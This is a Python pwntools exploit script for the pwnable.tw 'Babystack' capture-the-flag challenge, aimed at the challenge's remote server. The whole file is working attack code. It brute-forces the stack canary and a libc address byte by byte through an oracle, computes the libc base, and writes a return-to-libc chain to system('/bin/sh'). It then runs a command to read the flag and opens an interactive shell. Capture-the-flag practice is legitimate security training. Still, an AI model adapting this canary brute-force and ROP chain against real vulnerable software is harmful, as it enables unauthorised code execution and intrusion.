#Exploit for pwnable.tw/Babystack
from pwn import *
target = process(['./babystack', './ld-2.23.so'], env = {"LD_PRELOAD":"./libc_64.so.6"})
target = remote('chall.pwnable.tw', 10205)
elf = ELF('./babystack')
libc = ELF('./libc_64.so.6')

def sa(s, d):
	target.sendafter(s, d)

def check(passs):	#passs should be <= 0x7f bytes
	sa(">> ", "1")
	sa(":", passs)

def magic(s):		#s should be <= 0x3f bytes
	sa(">> ", "3")
	sa(":", s)

canary = ""
for i in range(0x10):
	curr = 1
	while curr < 0x100:
		check(canary + p8(curr) + "\x00")
		msg = target.recvuntil("!")
		if "Success" in msg:
			canary = canary + p8(curr)
			print canary
			sa(">> ", "1")
			break
		curr = curr + 1

check(canary + "\x00" + "C"*0x2f + "C"*8)
magic("B"*0x3f)
sa(">> ", "1")

libc_leak = "\x39"
for j in range(4):
	curr = 1
	print "Running " + str(j)
	while curr < 0x100:
		check("C"*8 + libc_leak + p8(curr) + "\x00")
		msg = target.recvuntil("!")
		if "Success" in msg:
			libc_leak = libc_leak + p8(curr)
			print libc_leak
			sa(">> ", "1")
			break
		curr = curr + 1

libc_leak = (libc_leak + "\x7f").ljust(8, "\x00")
libc_base = u64(libc_leak) - (0x00007f68623db439 - 0x00007f6862363000)
log.info(hex(libc_base))

pop_rdi = p64(libc_base + 0x0000000000021102)
bin_sh  = p64(libc_base + libc.search("/bin/sh\x00").next())
system  = p64(libc_base + libc.sym['system'])
gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

check("C"*8 + libc_leak + "\x00" + "C"*0x2f + canary + "A"*0x28 + system[:7])
magic("F"*0x3f)
sa(">> ", "1")
check(canary + "\x00" + "C"*0x2f + canary + "A"*0x27 + "\x00")
magic("F"*0x3f)
sa(">> ", "1")
check(canary + "\x00" + "C"*0x2f + canary + "A"*0x20 + bin_sh)
magic("F"*0x3f)
sa(">> ", "1")
check(canary + "\x00" + "C"*0x2f + canary + "A"*0x1f + "\x00")
magic("F"*0x3f)
sa(">> ", "1")
check(canary + "\x00" + "C"*0x2f + canary + "A"*0x18 + pop_rdi)
magic("F"*0x3f)
sa(">> ", "1")
sa(">> ", "2")
target.sendline("cat /home/*/fl*")
target.interactive()
